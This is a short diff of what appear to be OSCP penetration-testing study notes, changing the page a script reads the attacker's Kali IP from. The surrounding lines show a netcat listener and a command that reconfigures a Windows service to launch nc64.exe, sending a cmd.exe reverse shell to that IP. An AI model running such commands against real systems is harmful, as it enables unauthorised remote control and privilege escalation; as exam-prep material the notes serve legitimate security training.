@@ -46,7 +46,7 @@ nc -lvnp 4444
 
 Hijack and start sc.exe
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `sc.exe config vss binPath="C:\\\Users\\\svc-printer\\\Desktop\\nc64.exe -e cmd.exe ${KaliIP} 4444"`;
 
